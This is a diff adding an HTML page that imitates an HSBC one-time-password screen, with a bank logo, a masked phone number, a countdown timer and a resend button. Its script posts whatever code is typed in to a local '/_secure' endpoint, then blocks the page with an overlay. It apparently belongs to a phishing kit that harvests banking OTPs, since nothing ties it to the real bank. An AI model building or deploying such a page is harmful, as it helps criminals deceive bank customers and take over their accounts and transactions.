@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Page</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #ffffff;
+    }
+    #topRightImage {
+        position: absolute;
+        top: 10px; /* Adjust as needed */
+        right: 10px; /* Adjust as needed */
+        width: 250px; /* Adjust width as needed */
+        height: auto; /* Maintain aspect ratio */
+    }
+
+    .container {
+        text-align: center;
+        border: 3px solid #e7bbbb; /* Border properties */
+        border-radius: 20px; /* Rounded border */
+        padding: 30px; /* Padding inside the border */
+        position: relative; /* Necessary for absolute positioning of the image */
+        font-size: 15px;
+        width:350px;
+    }
+
+    .otp-form {
+        margin-bottom: 20px;
+    }
+
+    .otp-form input[type="text"] {
+        padding: 10px;
+        width: 300px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 16px;
+    }
+
+    .otp-form button {
+        padding: 10px 20px;
+        background-color: #9b2c10;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        font-size: 16px;
+        cursor: pointer;
+    }
+
+    .otp-form button:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
+    }
+    .logo {
+        width: 70px; /* Adjust size as needed */
+        margin-right: 10px; /* Adjust spacing between logo and heading */
+    }
+    .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent white */
+        z-index: 999; /* Ensure the overlay is above other content */
+        display: none; /* Initially hidden */
+    }
+    #message {
+        color: green;
+        font-weight: bold;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <img src="/static/Hsbc_icon.png" alt="HSBC Logo" class="logo">
+        <h2 style="color: red;">One-Time Password</h2>
+        <p>The One Time Password for the current transaction is sent to your registered mobile number ending with xxxxxxx874</p>
+    </div>
+    <form class="otp-form" id="otpForm">
+        <input type="text" id="otp" name="otp" placeholder="Enter OTP" required><br><br>
+        <button type="submit" id="submitBtn">Submit</button><br><br>
+        <button type="button" id="resendBtn" disabled>Resend OTP</button><br><br>
+        <div id="timer">Time remaining: 2:00</div>
+        <div id="message"></div> <!-- Container for displaying messages -->
+    </form>
+    <div class="overlay" id="overlay"></div>
+</div>
+
+<script>
+
+document.getElementById('otpForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        var otp = document.getElementById('otp').value;
+        
+        // Send OTP to otp_secure endpoint
+        fetch('/_secure', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ "otp": otp })
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log(response);
+                console.log('OTP sent successfully.');
+                return response.json();
+                // Handle success response if needed
+            } else {
+                console.error('Error sending OTP.');
+                throw new Error('Error sending OTP.');
+                // Handle error response if needed
+            }
+        })
+        .then(data => {
+            // Log the data returned from the endpoint
+            console.log(data);
+         
+            showMessage(data.message);
+            // alert(data.message); // Display a message to the user
+                if (data.message === 'OTP processed successfully') {
+                startTimer();
+                document.getElementById('overlay').style.display = 'block';
+            
+            }
+        })
+        .catch(error => {
+            console.error('Error sending OTP:', error);
+            // Handle fetch error if needed
+        });
+    });
+    // Timer countdown
+    var timerElement = document.getElementById('timer');
+    var secondsRemaining = 120;
+    var countdownInterval;
+
+    function countdown() {
+        var minutes = Math.floor(secondsRemaining / 60);
+        var seconds = secondsRemaining % 60;
+
+        if (seconds < 10) {
+            seconds = '0' + seconds;
+        }
+
+        timerElement.textContent = 'Time remaining: ' + minutes + ':' + seconds;
+
+        if (secondsRemaining <= 0) {
+            clearInterval(countdownInterval);
+            timerElement.textContent = 'Time expired';
+            document.getElementById('resendBtn').disabled = false;
+        } else {
+            secondsRemaining--;
+        }
+    }
+
+    countdownInterval = setInterval(countdown, 1000);
+
+    // Resend OTP button click handler
+    document.getElementById('resendBtn').addEventListener('click', function() {
+        // Reset timer and enable resend button
+        secondsRemaining = 120;
+        countdownInterval = setInterval(countdown, 1000);
+        this.disabled = true;
+        timerElement.textContent = 'Time remaining: 2:00';
+        // Additional logic to resend OTP if needed
+    });
+
+    // Function to display message on the frontend
+    function showMessage(message) {
+    var messageElement = document.getElementById('message');
+    messageElement.textContent = message;
+}
+    // Form submission handler
+    document.getElementById('otpForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        // Handle form submission (e.g., validate OTP)
+        // Additional logic goes here
+    });
+</script>
+</body>
+</html>
